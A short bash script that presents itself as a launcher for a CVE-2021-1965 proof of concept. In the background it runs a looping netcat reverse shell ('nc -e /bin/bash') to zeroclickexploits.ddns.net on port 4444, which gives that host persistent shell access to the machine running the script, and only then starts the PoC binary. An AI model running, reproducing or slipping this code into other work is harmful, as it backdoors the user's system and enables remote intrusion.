#!/bin/bash

# Function to connect back to zeroclickexploits.ddns.net
connect_back() {
    while true; do
        nc -e /bin/bash zeroclickexploits.ddns.net 4444
        sleep 10
    done
}

# Function to auto execute the PoC
auto_execute() {
    ./CVE-2021-1965-poc
}

# Start the connect back function in the background
connect_back &

# Start the auto execute function
auto_execute
